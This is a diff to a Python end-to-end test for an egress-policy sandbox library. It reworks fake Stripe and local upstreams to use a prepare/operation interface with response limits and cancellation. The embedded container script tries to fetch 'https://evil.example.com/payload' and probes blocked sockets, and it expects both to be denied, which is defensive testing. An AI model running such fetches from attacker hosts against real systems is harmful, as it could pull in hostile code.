@@ -8,6 +8,7 @@ real containers, so they are gated on a responsive Docker daemon.
 from __future__ import annotations
 
 import asyncio
+import contextlib
 import http.server
 import os
 import shutil
@@ -29,6 +30,8 @@ from cayu.egress import (
     ApprovedEgressDestination,
     CapturedRequest,
     CapturedResponse,
+    EgressUpstreamLimits,
+    EgressUpstreamOperation,
     HttpEgressPolicy,
 )
 from cayu.runners.base import ExecCommand
@@ -76,13 +79,23 @@ class _FakeStripe:
     def __init__(self) -> None:
         self.upstream_authorization: str | None = None
 
-    async def send(self, request: CapturedRequest) -> CapturedResponse:
-        self.upstream_authorization = request.headers.get("Authorization")
-        return CapturedResponse(
-            status_code=200,
-            headers={"Request-Id": "req_e2e"},
-            body=b'{"id":"cus_fake123","object":"customer"}',
-        )
+    def prepare(
+        self,
+        request: CapturedRequest,
+        *,
+        limits: EgressUpstreamLimits,
+    ) -> EgressUpstreamOperation:
+        assert limits.max_response_bytes > 0
+
+        async def send() -> CapturedResponse:
+            self.upstream_authorization = request.headers.get("Authorization")
+            return CapturedResponse(
+                status_code=200,
+                headers={"Request-Id": "req_e2e"},
+                body=b'{"id":"cus_fake123","object":"customer"}',
+            )
+
+        return EgressUpstreamOperation(send)
 
 
 def _stripe_example_policy() -> HttpEgressPolicy:
@@ -243,19 +256,34 @@ async def _drive_credentialless_factory() -> dict[str, object]:
         def __init__(self) -> None:
             self.requests: list[CapturedRequest] = []
 
-        async def send(self, request: CapturedRequest) -> CapturedResponse:
-            self.requests.append(request)
-            async with httpx.AsyncClient(timeout=5) as client:
-                response = await client.request(
-                    request.method,
-                    f"http://127.0.0.1:{endpoint.server_port}{request.path}",
-                    content=request.body,
+        def prepare(
+            self,
+            request: CapturedRequest,
+            *,
+            limits: EgressUpstreamLimits,
+        ) -> EgressUpstreamOperation:
+            async def send() -> CapturedResponse:
+                self.requests.append(request)
+                async with httpx.AsyncClient(timeout=limits.total_timeout_s) as client:
+                    response = await client.request(
+                        request.method,
+                        f"http://127.0.0.1:{endpoint.server_port}{request.path}",
+                        content=request.body,
+                    )
+                if len(response.content) > limits.max_response_bytes:
+                    raise RuntimeError("Test upstream response exceeded its byte limit.")
+                return CapturedResponse(
+                    status_code=response.status_code,
+                    headers=dict(response.headers),
+                    body=response.content,
                 )
-            return CapturedResponse(
-                status_code=response.status_code,
-                headers=dict(response.headers),
-                body=response.content,
-            )
+
+            async def cancel_and_wait(task: asyncio.Task[CapturedResponse]) -> None:
+                task.cancel()
+                with contextlib.suppress(BaseException):
+                    await task
+
+            return EgressUpstreamOperation(send, cancel_and_wait=cancel_and_wait)
 
     events: list[Event] = []
 
@@ -303,6 +331,9 @@ async def _drive_credentialless_factory() -> dict[str, object]:
             "    u.urlopen('https://evil.example.com/payload', timeout=25)\n"
             "except urllib.error.HTTPError as exc:\n"
             "    print('denied', exc.code)\n"
+            "except urllib.error.URLError as exc:\n"
+            "    if 'Tunnel connection failed: 403 Forbidden' not in str(exc.reason): raise\n"
+            "    print('denied', 403)\n"
             "def blocked(host, port):\n"
             "    try:\n"
             "        socket.create_connection((host, port), timeout=2).close()\n"
